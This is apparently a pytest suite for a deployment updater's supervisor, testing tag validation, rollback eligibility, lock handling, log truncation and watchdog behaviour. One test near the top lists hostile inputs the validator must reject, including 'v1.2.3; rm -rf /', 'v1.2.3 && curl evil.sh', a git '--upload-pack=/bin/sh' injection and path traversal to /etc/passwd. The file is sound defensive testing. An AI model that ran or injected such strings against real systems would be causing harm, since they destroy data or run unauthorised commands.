"""The updater's decisions, tested without Docker.

Everything here is a pure function on purpose. The alternative — a bash
supervisor calling `python3 -c` for JSON — would put tag validation, the
security-critical part, outside any test the suite can run.
"""
import pytest

from updater.supervisor import (
    MIN_ROLLBACK_TAG,
    clamp_log_tail,
    eligible_rollback_targets,
    is_stale_lock,
    parse_deployed_tags,
    step_for_line,
    validate_tag,
)


# ── Tag validation ───────────────────────────────────────────────────────────

@pytest.mark.parametrize("tag", ["v1.0.0", "v0.0.1", "v10.20.30", "v1.2.3", "v0.0.0", "v0.9.9"])
def test_valid_tags_accepted(tag):
    assert validate_tag(tag) is True


@pytest.mark.parametrize("tag", [
    "--upload-pack=/bin/sh",     # git argument injection
    "v1.2.3; rm -rf /",          # shell metacharacters
    "v1.2.3 && curl evil.sh",
    "$(whoami)",
    "`id`",
    "../../etc/passwd",          # path traversal
    "../v1.0.0",
    "v1.2.3-rc1",                # prereleases are deliberately not deployable
    "V1.2.3",                    # wrong case
    "1.2.3",                     # missing the v
    "v1.2",                      # not three components
    "v1.2.3.4",
    "latest",
    "",
    "   ",
    None,
    "v01.0.0",                   # leading zero: same distinct-ref/same-tuple
    "v1.00.0",                   # collision class as the homoglyph case
    "v1.0.00",
])
def test_hostile_and_malformed_tags_rejected(tag):
    assert validate_tag(tag) is False


def test_validation_rejects_embedded_newline():
    """A newline would let a second line reach a log or a file write intact."""
    assert validate_tag("v1.0.0\nv2.0.0") is False


def test_validation_rejects_a_trailing_newline():
    """Python's `$` also matches just before a trailing newline, so a regex
    anchored with `$` accepts "v1.0.0\n". The anchor must be `\\Z`."""
    assert validate_tag("v1.0.0\n") is False


def test_validation_rejects_unicode_digits():
    """`\\d` is Unicode-aware in Python, so it accepts Arabic-Indic digits.
    "v١.٠.٠" is a DIFFERENT git ref that parse_version() reads as the same
    (1, 0, 0) tuple as "v1.0.0" — a homoglyph collision in the one function
    whose job is to pin an exact release."""
    assert validate_tag("v١.٠.٠") is False


@pytest.mark.parametrize("tag", [b"v1.0.0", 1.0, 100, ["v1.0.0"], {"tag": "v1.0.0"}, True])
def test_non_string_tags_rejected_without_raising(tag):
    """The tag arrives from JSON written by another process, so a non-str is a
    real possibility. re.match would raise TypeError rather than return False."""
    assert validate_tag(tag) is False


# ── .deployed parsing and rollback eligibility ───────────────────────────────

def test_parse_deployed_extracts_tags_in_order():
    text = (
        "2026-07-26T18:54:28Z v1.0.0\n"
        "2026-07-27T09:00:00Z v1.1.0\n"
        "2026-07-27T10:00:00Z v1.0.0\n"
    )
    assert parse_deployed_tags(text) == ["v1.0.0", "v1.1.0", "v1.0.0"]


def test_parse_deployed_ignores_junk_lines():
    assert parse_deployed_tags("\ngarbage\n2026-07-26T18:54:28Z v1.0.0\n") == ["v1.0.0"]


def test_eligible_targets_excludes_the_running_tag():
    lines = "t v1.1.0\nt v1.2.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.2.0") == ["v1.1.0"]


def test_eligible_targets_refuses_below_the_updater_floor():
    """Rolling back past the release that introduced the updater checks out a
    compose file with no /control mount, so the app returns unable to submit
    OR read requests. That is a one-way door back to SSH, not a degraded mode."""
    lines = "t v1.0.0\nt v1.1.0\nt v1.2.0\n"
    targets = eligible_rollback_targets(lines, current_tag="v1.2.0")
    assert "v1.0.0" not in targets
    assert targets == ["v1.1.0"]


def test_min_rollback_tag_is_itself_eligible():
    lines = f"t {MIN_ROLLBACK_TAG}\nt v9.9.9\n"
    assert MIN_ROLLBACK_TAG in eligible_rollback_targets(lines, current_tag="v9.9.9")


def test_eligible_targets_are_deduped_and_version_ordered_newest_first():
    lines = "t v1.1.0\nt v1.10.0\nt v1.2.0\nt v1.1.0\nt v2.0.0\n"
    assert eligible_rollback_targets(lines, current_tag="v2.0.0") == [
        "v1.10.0", "v1.2.0", "v1.1.0",
    ]


def test_eligible_targets_drops_malformed_entries():
    lines = "t v1.1.0\nt not-a-tag\nt v1.2.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.2.0") == ["v1.1.0"]


def test_eligible_targets_empty_when_only_one_release_recorded():
    """The live host is in exactly this state: .deployed holds one line."""
    assert eligible_rollback_targets("t v1.0.0\n", current_tag="v1.0.0") == []


def test_eligible_targets_excludes_releases_newer_than_the_running_one():
    """A control labelled "Roll back" must not offer to move forward. Going
    forward is what the tag field is for, and rollback.sh's own bare mode
    already means "the newest release strictly older than the running one"."""
    lines = "t v1.1.0\nt v1.2.0\nt v1.3.0\nt v1.2.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.2.0") == ["v1.1.0"]


def test_eligible_targets_empty_when_running_the_oldest_recorded_release():
    lines = "t v1.1.0\nt v1.2.0\nt v1.1.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.1.0") == []


def test_eligible_targets_fail_closed_on_an_unparseable_current_tag():
    """Skipping the at-or-newer guard would offer releases NEWER than the
    running one. This function is also the pickup-time re-validation, so
    failing open here would let a mislabelled "roll back" actually execute."""
    lines = "t v1.1.0\nt v9.9.9\n"
    assert eligible_rollback_targets(lines, current_tag="garbage") == []
    assert eligible_rollback_targets(lines, current_tag=None) == []
    assert eligible_rollback_targets(lines, current_tag="dev") == []


def test_eligible_targets_reject_what_parse_version_would_accept():
    """parse_version is the LAXER regex — it happily parses "v1.3.0-rc1" and
    "v١.٠.٠". validate_tag must therefore run FIRST. A prerelease in .deployed
    is normal operation, not hypothetical: deploy.sh --tag v1.3.0-rc1 is the
    documented escape hatch and [3/5] records whatever it deployed."""
    lines = "t v1.1.0\nt v1.3.0-rc1\nt v١.٠.٠\nt v1.4.0\n"
    assert eligible_rollback_targets(lines, current_tag="v1.4.0") == ["v1.1.0"]


# ── Lock staleness ───────────────────────────────────────────────────────────

def test_lock_held_by_a_live_recent_process_is_not_stale():
    lock = {"pid": 42, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1060.0, pid_alive=lambda p: True) is False


def test_lock_with_a_dead_pid_is_stale():
    """Without this a killed updater wedges the feature permanently, and the
    only recovery is the SSH session this whole feature exists to avoid."""
    lock = {"pid": 42, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1060.0, pid_alive=lambda p: False) is True


def test_lock_older_than_thirty_minutes_is_stale_even_if_the_pid_lives():
    lock = {"pid": 42, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1000.0 + 1801, pid_alive=lambda p: True) is True


def test_unparseable_lock_is_stale():
    assert is_stale_lock({}, now=1.0, pid_alive=lambda p: True) is True
    assert is_stale_lock(None, now=1.0, pid_alive=lambda p: True) is True


@pytest.mark.parametrize("pid", [True, False, 0, -1, "123", None, 1.5])
def test_lock_with_an_out_of_range_or_wrong_type_pid_is_stale(pid):
    """isinstance(True, int) is True since bool subclasses int, so a bare type
    check alone would accept True/False as pids. pid=0 signals the entire
    process group via os.kill and pid=-1 signals every process the caller's
    uid can reach — both would report "alive" via a real side effect rather
    than a lookup, so treating them as valid pids is unsafe even before
    considering whether the callback is well-behaved."""
    lock = {"pid": pid, "started_at": 1000.0}
    assert is_stale_lock(lock, now=1010.0, pid_alive=lambda p: True) is True


# ── deploy.sh output → step ──────────────────────────────────────────────────

@pytest.mark.parametrize("line,step", [
    ("[0/5] preflight: external 'web' network + compose declaration", "preflight"),
    ("[1/5] Deploy v1.1.0 (checkout + pull + recreate)", "deploying"),
    ("[2/5] Health check", "awaiting-health"),
    ("→ Automatically reverting to v1.0.0", "reverting"),
    ("[3/5] Record the deploy", "finalizing"),
    ("[4/5] Startup log scan", "finalizing"),
    ("[5/5] Done", "finalizing"),
    ("[1/4] Roll back to v1.0.0", "deploying"),
    ("[4/4] Health check", "awaiting-health"),
])
def test_step_markers_recognised(line, step):
    assert step_for_line(line) == step


def test_unrecognised_output_does_not_change_the_step():
    assert step_for_line("     resolved latest release: v1.1.0") is None


def test_app_log_output_cannot_walk_progress_backwards():
    """[4/5] echoes raw `docker logs` into the same stream, so an application
    log line mentioning a marker must not be mistaken for one. Real markers are
    always at column 0."""
    assert step_for_line("2026-07-26 INFO worker [1/5] starting batch") is None
    assert step_for_line("  WARNING: Automatically reverting cache entry") is None
    assert step_for_line("[1/5] Deploy v1.1.0 (checkout + pull + recreate)") == "deploying"


# ── Log clamping ─────────────────────────────────────────────────────────────

def test_log_tail_capped_at_one_hundred_lines():
    assert len(clamp_log_tail([f"line {i}" for i in range(500)])) == 100


def test_log_tail_keeps_the_most_recent_lines():
    out = clamp_log_tail([f"line {i}" for i in range(500)])
    assert out[-1] == "line 499"


def test_log_tail_capped_at_eight_kilobytes():
    """A chatty failure must not be able to fill the control volume."""
    out = clamp_log_tail(["x" * 1000] * 100)
    assert sum(len(l.encode()) for l in out) <= 8192


def test_log_tail_never_empties_on_a_single_oversized_line():
    """A docker pull dump or a traceback arrives as ONE long line. Popping
    until it fits would leave the operator staring at nothing on the exact
    path where the log is all they have."""
    out = clamp_log_tail(["x" * 100_000])
    assert len(out) == 1
    assert sum(len(l.encode()) for l in out) <= 8192
    assert out[0].startswith("...")


def test_log_tail_truncation_keeps_the_end_not_the_beginning():
    """A traceback's exception line and a progress dump's final state are both
    at the END. Keeping the head threw away the only line that says what went
    wrong, on the exact path where the log tail is all the operator has."""
    tb = ("Traceback (most recent call last):\n"
          + '  File "x.py", line 1, in f\n' * 4000
          + "ValueError: THE ACTUAL ERROR MESSAGE\n")
    out = clamp_log_tail([tb])
    assert "ValueError: THE ACTUAL ERROR MESSAGE" in out[0]
    assert out[0].startswith("...")
    assert len(out[0].encode()) <= 8192


def test_log_tail_of_empty_input_is_empty():
    assert clamp_log_tail([]) == []


def test_log_tail_cap_counts_bytes_not_characters():
    """deploy.sh emits 3-byte UTF-8 (→ ✓ ✗ ⚠) on the auto-revert path, so a
    character-counted cap silently allowed 2x the intended size — 4x for emoji.
    The constant is named _BYTES and justified by disk space on a shared volume."""
    for filler in ("é", "🚀"):
        out = clamp_log_tail([filler * 9000])
        assert sum(len(l.encode()) for l in out) <= 8192, filler


def test_log_tail_truncation_never_splits_a_codepoint():
    """A byte slice landing mid-codepoint would produce invalid UTF-8, which the
    app's json.load would reject — turning a readable failure into no status
    at all."""
    out = clamp_log_tail(["🚀" * 9000])
    assert len(out) == 1
    out[0].encode("utf-8")            # must not raise
    assert out[0].startswith("...")


# ── Run loop (filesystem, still no Docker) ───────────────────────────────────

import json
import os

from updater.supervisor import (
    build_command,
    claim_request,
    read_json,
    seen_request,
    write_json_atomic,
)


def test_write_json_atomic_leaves_no_tmp_behind(tmp_path):
    target = tmp_path / "status.json"
    write_json_atomic(target, {"state": "running"})
    assert json.loads(target.read_text())["state"] == "running"
    assert list(tmp_path.iterdir()) == [target]


def test_write_json_atomic_overwrites_cleanly(tmp_path):
    target = tmp_path / "status.json"
    write_json_atomic(target, {"n": 1})
    write_json_atomic(target, {"n": 2})
    assert json.loads(target.read_text())["n"] == 2


def test_claim_request_renames_so_a_second_claim_finds_nothing(tmp_path):
    """Read-then-unlink races a second writer; rename() is atomic within a
    filesystem, so the loser simply has nothing to claim."""
    req = tmp_path / "request.json"
    req.write_text(json.dumps({"id": "abc", "action": "update", "tag": "v1.1.0"}))
    claimed1, first = claim_request(tmp_path)
    claimed2, second = claim_request(tmp_path)
    assert claimed1 is True
    assert first["id"] == "abc"
    assert claimed2 is False
    assert second is None
    assert not req.exists()
    assert (tmp_path / "request.json.claimed").exists()


def test_claim_request_returns_none_when_absent(tmp_path):
    assert claim_request(tmp_path) == (False, None)


def test_claim_request_returns_none_on_malformed_json(tmp_path):
    (tmp_path / "request.json").write_text("{not json")
    assert claim_request(tmp_path) == (True, None)


def test_claim_request_distinguishes_nothing_from_unusable(tmp_path):
    """Collapsing these into None consumed the operator's click silently: the
    rename had already happened, so the request was gone while the app went on
    showing the previous run's status."""
    assert claim_request(tmp_path) == (False, None)

    (tmp_path / "request.json").write_text('{"id": "abc", "action": "upda')
    assert claim_request(tmp_path) == (True, None)
    assert not (tmp_path / "request.json").exists()


def test_claim_request_rejects_a_non_dict_payload(tmp_path):
    """A JSON array reached request.get() and raised AttributeError OUTSIDE any
    try, killing the poll loop — the sidecar died until container restart."""
    (tmp_path / "request.json").write_text("[1, 2]")
    assert claim_request(tmp_path) == (True, None)


def test_replayed_request_id_is_ignored():
    seen = []
    assert seen_request("abc", seen) is False
    assert seen_request("abc", seen) is True


def test_seen_ids_are_bounded_to_fifty():
    seen = []
    for i in range(120):
        seen_request(f"id-{i}", seen)
    assert len(seen) == 50
    assert seen_request("id-119", seen) is True    # recent one still remembered
    assert seen_request("id-0", seen) is False     # oldest has aged out


def test_build_command_for_update_uses_argv_not_a_shell_string():
    cmd = build_command("update", "v1.1.0", root="/opt/vigilant")
    assert isinstance(cmd, list)
    assert cmd == ["/opt/vigilant/scripts/deploy.sh", "--tag", "v1.1.0"]


def test_build_command_for_rollback():
    cmd = build_command("rollback", "v1.1.0", root="/opt/vigilant")
    assert cmd == ["/opt/vigilant/scripts/rollback.sh", "--to", "v1.1.0"]


def test_build_command_refuses_an_unknown_action():
    with pytest.raises(ValueError):
        build_command("rm-rf", "v1.1.0", root="/opt/vigilant")


def test_read_json_returns_none_for_missing_or_broken(tmp_path):
    assert read_json(tmp_path / "nope.json") is None
    bad = tmp_path / "bad.json"
    bad.write_text("{{{")
    assert read_json(bad) is None


from updater.supervisor import _REVERT_OK_RE, _REVERT_FAILED_RE


def test_revert_tag_parsed_from_the_real_deploy_sh_wording():
    """deploy.sh:207 prints "✓ Reverted to v1.0.0; the site is serving." — the
    tag is NOT the last whitespace-separated token, and line.split()[-1] yields
    "serving.", which would render "Reverted to serving." in the UI on the
    failure path."""
    ok = _REVERT_OK_RE.match("✓ Reverted to v1.0.0; the site is serving.")
    assert ok and ok.group(1) == "v1.0.0"
    bad = _REVERT_FAILED_RE.match(
        "✗ Revert to v1.0.0 ALSO failed — manual intervention needed.")
    assert bad and bad.group(1) == "v1.0.0"


def test_revert_regexes_ignore_the_revert_start_line():
    """"→ Automatically reverting to v1.0.0" announces the START of a revert;
    treating it as the outcome would report success before it happened."""
    line = "→ Automatically reverting to v1.0.0"
    assert _REVERT_OK_RE.match(line) is None
    assert _REVERT_FAILED_RE.match(line) is None


def test_every_marker_matches_a_line_the_real_scripts_actually_print():
    """The markers are substrings of live production scripts. If someone edits
    an echo in deploy.sh, progress silently stops advancing — this fails first."""
    import re as _re
    from updater.supervisor import _STEP_MARKERS
    emitted = []
    for path in ("scripts/deploy.sh", "scripts/rollback.sh"):
        with open(path) as fh:
            src = fh.read()
        for m in _re.finditer(r'^\s*echo\s+"([^"]*)"', src, _re.M):
            emitted.append(_re.sub(r"\$\{?\w+\}?", "X", m.group(1)))
    for marker, _step in _STEP_MARKERS:
        assert any(line.startswith(marker) for line in emitted), \
            f"no line in deploy.sh/rollback.sh starts with {marker!r}"


# ── Watchdog: the wall-clock ceiling must actually fire ──────────────────────

def test_a_hang_that_keeps_printing_is_still_killed(tmp_path, monkeypatch):
    """The original design put the ceiling on wait(timeout=...), which is only
    reached after EOF — so a stalled `docker pull` that keeps printing progress
    never closed the pipe and ran forever. Reproduced before this was fixed."""
    import updater.supervisor as sup

    script = tmp_path / "chatty.sh"
    script.write_text('#!/usr/bin/env bash\nwhile true; do echo "[1/5] x"; sleep 0.05; done\n')
    script.chmod(0o755)
    monkeypatch.setattr(sup, "_RUN_TIMEOUT_SECONDS", 1)
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])
    monkeypatch.setattr(sup, "eligible_rollback_targets", lambda *a, **k: ["v1.1.0"])

    import time as _t
    t0 = _t.monotonic()
    sup.run_action({"id": "x", "action": "update", "tag": "v1.1.0"})
    assert _t.monotonic() - t0 < 20, "watchdog did not fire"

    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "failed"
    assert "exceeded" in status["error"]


def test_a_silent_hang_is_killed(tmp_path, monkeypatch):
    """The other hang shape: blocked with no output at all, so the blocking
    readline never returns either."""
    import updater.supervisor as sup

    script = tmp_path / "silent.sh"
    script.write_text('#!/usr/bin/env bash\necho "[1/5] Deploy"\nsleep 300\n')
    script.chmod(0o755)
    monkeypatch.setattr(sup, "_RUN_TIMEOUT_SECONDS", 1)
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])
    monkeypatch.setattr(sup, "eligible_rollback_targets", lambda *a, **k: ["v1.1.0"])

    import time as _t
    t0 = _t.monotonic()
    sup.run_action({"id": "y", "action": "update", "tag": "v1.1.0"})
    assert _t.monotonic() - t0 < 20, "watchdog did not fire"
    assert json.loads((tmp_path / "status.json").read_text())["state"] == "failed"


# ── Silent-drop paths must publish a refusal ──────────────────────────────────

def test_a_request_with_no_id_is_recorded_not_silently_dropped(tmp_path, monkeypatch):
    """claim_request() consumes the file, so a bare `continue` would make the
    click vanish while the app kept showing the previous run's status."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    sup._publish_refusal({"action": "update", "tag": "v1.1.0"}, "Request had no id and was refused.")
    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "failed"
    assert "no id" in status["error"]


# ── Loop-body coverage (was previously untestable: run() never returns) ──────

def test_pid_alive_treats_permission_denied_as_alive():
    """os.kill(1, 0) raises PermissionError for a process we may not signal.
    The obvious `except OSError: return False` would call it dead and reclaim a
    lock still in use. This constraint had zero coverage — reverting it passed
    all 93 tests."""
    from updater.supervisor import _pid_alive
    assert _pid_alive(1) is True            # exists, not ours
    assert _pid_alive(999_999) is False     # does not exist


def test_a_tick_that_runs_an_action_advances_the_step(tmp_path, monkeypatch):
    """Nothing asserted status["step"] ever moved, so prefixing the line before
    step_for_line — which breaks startswith matching — passed the whole suite."""
    import updater.supervisor as sup
    script = tmp_path / "fake-deploy.sh"
    script.write_text(
        '#!/usr/bin/env bash\n'
        'echo "[0/5] preflight: external \'web\' network"\n'
        'echo "[2/5] Health check"\n'
        'echo "[5/5] Done"\n')
    script.chmod(0o755)
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])

    sup.run_action({"id": "s1", "action": "update", "tag": "v1.1.0"})
    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "success"
    assert status["step"] == "done"


def test_rollback_eligibility_is_read_fresh_not_from_the_heartbeat(tmp_path, monkeypatch):
    """AC5's headline requirement had no test. The heartbeat's list is UX; the
    authority is a fresh read of .deployed at pickup time."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    (tmp_path / ".deployed").write_text(
        "t v1.1.0\nt v1.2.0\nt v1.3.0\n")
    sup.write_heartbeat({"socket": "ok"})
    assert "v1.1.0" in json.loads((tmp_path / "updater.json").read_text())["targets"]

    # .deployed changes underneath — the cached heartbeat is now stale.
    (tmp_path / ".deployed").write_text("t v1.3.0\n")
    monkeypatch.setattr(sup, "build_command",
                        lambda a, t, root=None: ["/bin/false"])
    sup.run_action({"id": "r1", "action": "rollback", "tag": "v1.1.0"})
    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "failed"
    assert "not an eligible rollback target" in status["error"]


def test_tick_survives_a_request_that_would_have_killed_the_loop(tmp_path, monkeypatch):
    """A JSON array used to reach request.get() and raise AttributeError outside
    any try, exiting run() and taking the feature down until container restart."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    (tmp_path / "request.json").write_text("[1, 2]")
    sup._tick([], tmp_path / "update.lock")      # must not raise
    status = json.loads((tmp_path / "status.json").read_text())
    assert status["state"] == "failed"
    assert "unreadable" in status["error"]


# ── Orphaned status reconciliation (a killed sidecar must not lie forever) ───

def test_an_orphaned_running_status_is_closed_out_on_restart(tmp_path, monkeypatch):
    """A SIGKILLed or OOM-killed sidecar leaves status.json saying "running"
    with nobody left to finish it, and the panel spins forever."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    (tmp_path / "status.json").write_text(json.dumps({
        "id": "abc", "action": "update", "state": "running", "step": "deploying",
        "to_tag": "v1.1.0", "error": None, "finished_at": None}))
    sup._reconcile_orphaned_status()
    st = json.loads((tmp_path / "status.json").read_text())
    assert st["state"] == "failed"
    assert st["finished_at"]
    assert "outcome is unknown" in st["error"]


def test_reconcile_leaves_a_finished_status_alone(tmp_path, monkeypatch):
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    (tmp_path / "status.json").write_text(json.dumps({"state": "success", "step": "done"}))
    sup._reconcile_orphaned_status()
    assert json.loads((tmp_path / "status.json").read_text())["state"] == "success"


# ── Auto-revert, end to end ───────────────────────────────────────────────────

def _fake_deploy(tmp_path, name, body):
    s = tmp_path / name
    s.write_text("#!/usr/bin/env bash\n" + body)
    s.chmod(0o755)
    return s


def test_auto_revert_is_reported_end_to_end(tmp_path, monkeypatch):
    """deploy.sh's own auto-revert path, from raw output to status.json."""
    import updater.supervisor as sup
    script = _fake_deploy(tmp_path, "d.sh",
        'echo "[1/5] Deploy v1.1.0 (checkout + pull + recreate)"\n'
        'echo "[2/5] Health check"\n'
        'echo "→ Automatically reverting to v1.0.0"\n'
        'echo "✓ Reverted to v1.0.0; the site is serving."\n'
        'exit 1\n')
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])
    sup.run_action({"id": "r", "action": "update", "tag": "v1.1.0"})
    st = json.loads((tmp_path / "status.json").read_text())
    assert st["state"] == "failed"
    assert st["reverted_to"] == "v1.0.0"      # NOT "serving."


def test_a_failed_revert_is_reported_as_needing_a_human(tmp_path, monkeypatch):
    """Deploy failed AND its revert failed — nothing automatic is left."""
    import updater.supervisor as sup
    script = _fake_deploy(tmp_path, "d.sh",
        'echo "[2/5] Health check"\n'
        'echo "→ Automatically reverting to v1.0.0"\n'
        'echo "✗ Revert to v1.0.0 ALSO failed — manual intervention needed."\n'
        'exit 1\n')
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setattr(sup, "build_command", lambda a, t, root=None: [str(script)])
    sup.run_action({"id": "r2", "action": "update", "tag": "v1.1.0"})
    st = json.loads((tmp_path / "status.json").read_text())
    assert st["state"] == "failed"
    assert st["reverted_to"] is None
    assert "Manual intervention required" in st["message"]


# ── Stale lock: removed, not just logged ─────────────────────────────────────

def test_a_stale_lock_is_removed_not_just_logged(tmp_path, monkeypatch):
    """It was logged as "reclaiming" on every tick while staying on disk —
    ~86,400 identical warnings a day, and the message was not even true."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    lock = tmp_path / "update.lock"
    lock.write_text(json.dumps({"pid": 999_999, "started_at": 1.0}))
    sup._tick([], lock)
    assert not lock.exists()


# ── Status schema defined once ────────────────────────────────────────────────

def test_status_schema_has_exactly_the_keys_the_app_expects(tmp_path, monkeypatch):
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    expected = {"id", "action", "state", "step", "from_tag", "to_tag", "message",
                "error", "reverted_to", "log_tail", "started_at", "finished_at"}
    assert set(sup._new_status()) == expected
    sup._publish_refusal({"id": "x"}, "nope")
    assert set(json.loads((tmp_path / "status.json").read_text())) == expected


# ── Self-checks key set is part of the app-facing contract ───────────────────

def test_self_checks_key_set(monkeypatch):
    import updater.supervisor as sup
    monkeypatch.setattr(sup.subprocess, "run", lambda *a, **k: None)
    monkeypatch.setattr(sup, "ROOT", "/tmp")
    # .deployed does not need to exist for the key SET assertion — a FAIL value
    # is still a value, and this test is about which keys are published, not
    # whether the checks pass.
    assert set(sup._self_checks()) == {"socket", "git", "compose", "deployed"}
